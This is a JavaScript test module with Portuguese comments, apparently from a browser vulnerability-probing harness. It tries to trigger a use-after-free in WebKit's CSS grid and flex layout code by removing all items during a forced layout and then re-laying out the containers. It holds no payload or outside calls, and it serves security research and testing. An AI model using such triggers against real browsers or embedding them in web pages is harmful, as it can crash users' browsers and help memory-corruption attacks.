/**
 * SC_CSS_GRID_LAYOUT_UAF.JS
 * Categoria : DOM/STYLE — Use-After-Free
 * Alvo      : WebCore::RenderGrid / RenderFlexibleBox C++
 * Técnica   : Cria containers Grid/Flex com itens complexos, remove os
 *             itens durante um forced layout (offsetWidth) e força
 *             um segundo layout imediatamente. O RenderGrid C++ pode
 *             manter ponteiros para RenderBox de itens removidos durante
 *             o algoritmo de posicionamento de tracks.
 * Referência: WebKit RenderGrid item lifecycle UAF
 */

export default {
    id:          'CSS_GRID_LAYOUT_UAF',
    category:    'DOM/STYLE',
    risk:        'HIGH',
    description: 'RenderGrid/RenderFlex com itens removidos durante forced layout. '
                + 'Testa ponteiro stale para RenderBox C++ no algoritmo de tracks.',

    _grid:        null,
    _flex:        null,
    _items:       [],
    _container:   null,

    // Numéricos
    _gridWidthPre:  -1,
    _gridWidthPost: -1,
    _flexWidthPre:  -1,
    _flexWidthPost: -1,
    _itemCountPre:  -1,

    // Strings
    _gridDisplay: 'pending',
    _flexDisplay: 'pending',

    supported: function() {
        return typeof CSS !== 'undefined'
            && CSS.supports('display', 'grid');
    },

    setup: async function() {
        this._items        = [];
        this._gridWidthPre = -1; this._gridWidthPost = -1;
        this._flexWidthPre = -1; this._flexWidthPost = -1;
        this._itemCountPre = -1;
        this._gridDisplay  = 'pending'; this._flexDisplay = 'pending';

        this._container = document.createElement('div');
        this._container.style.cssText = 'position:absolute;left:0;top:0;width:600px;height:400px;overflow:hidden';
        document.body.appendChild(this._container);

        // Grid container com tracks complexos
        this._grid = document.createElement('div');
        this._grid.style.cssText = `
            display: grid;
            grid-template-columns: repeat(4, minmax(50px, 1fr));
            grid-template-rows: repeat(3, auto);
            gap: 8px;
            width: 100%;
        `;
        this._container.appendChild(this._grid);

        // Flex container
        this._flex = document.createElement('div');
        this._flex.style.cssText = `
            display: flex;
            flex-wrap: wrap;
            align-items: stretch;
            width: 100%;
            margin-top: 8px;
        `;
        this._container.appendChild(this._flex);

        // Cria 12 itens de grid e 8 de flex
        for (let i = 0; i < 12; i++) {
            const el = document.createElement('div');
            el.style.cssText = `
                background: hsl(${i*30},50%,50%);
                min-height: 40px;
                grid-column: span ${(i % 2) + 1};
            `;
            el.textContent    = `grid-${i}`;
            el.dataset.idx    = String(i);
            this._grid.appendChild(el);
            this._items.push(el);
        }

        for (let i = 0; i < 8; i++) {
            const el = document.createElement('div');
            el.style.cssText = `
                flex: ${(i % 3) + 1};
                min-height: 30px;
                background: hsl(${i*45},60%,40%);
            `;
            el.textContent = `flex-${i}`;
            this._flex.appendChild(el);
            this._items.push(el);
        }

        // Forced layout para inicializar os RenderObjects C++
        this._gridWidthPre = this._grid.offsetWidth;
        this._flexWidthPre = this._flex.offsetWidth;
        this._itemCountPre = this._items.length;
        this._gridDisplay  = window.getComputedStyle(this._grid).display;
        this._flexDisplay  = window.getComputedStyle(this._flex).display;

        await new Promise(r => requestAnimationFrame(r));
        await new Promise(r => setTimeout(r, 10));
    },

    trigger: async function() {
        // Inicia forced layout e remove itens NO MEIO do recálculo
        // Usando requestAnimationFrame para sincronizar com o render
        await new Promise(resolve => {
            requestAnimationFrame(() => {
                // Lê offsetWidth — força layout do grid
                void this._grid.offsetWidth;

                // Remove todos os itens DURANTE o frame de layout
                for (const el of this._items) {
                    try { el.remove(); } catch(_) {}
                }

                // Força OUTRO layout imediatamente após a remoção
                this._gridWidthPost = this._grid.offsetWidth;
                this._flexWidthPost = this._flex.offsetWidth;

                resolve();
            });
        });

        // Modifica os containers após remoção dos filhos
        try {
            this._grid.style.gridTemplateColumns = 'repeat(8, 1fr)';
            void this._grid.offsetWidth;
        } catch(_) {}

        try {
            this._flex.style.flexDirection = 'column';
            void this._flex.offsetWidth;
        } catch(_) {}

        // Re-acessa computed style após remoção dos itens
        await new Promise(r => requestAnimationFrame(r));
        await new Promise(r => setTimeout(r, 10));
    },

    probe: [
        // [0-3] dimensões — numéricos
        s => s._gridWidthPre,
        s => s._gridWidthPost,
        s => s._flexWidthPre,
        s => s._flexWidthPost,

        // [4-5] contagens
        s => s._itemCountPre,
        s => s._grid.childNodes.length,

        // [6-9] display e style pós-remoção — strings
        s => window.getComputedStyle(s._grid).display,
        s => s._gridDisplay,
        s => window.getComputedStyle(s._flex).display,
        s => s._flexDisplay,

        // [10-12] acesso aos itens removidos via referência
        s => String(s._items[0]?.isConnected  ?? 'null'),
        s => s._items[0]?.textContent         ?? 'null',
        s => window.getComputedStyle(s._items[0] ?? document.body).display,

        // [13] container intacto
        s => String(s._container.isConnected),
    ],

    cleanup: async function() {
        this._container?.remove();
        this._container    = null; this._grid = null; this._flex = null;
        this._items        = [];
        this._gridWidthPre = -1; this._gridWidthPost = -1;
        this._flexWidthPre = -1; this._flexWidthPost = -1;
        this._itemCountPre = -1;
        this._gridDisplay  = 'pending'; this._flexDisplay = 'pending';
    }
};
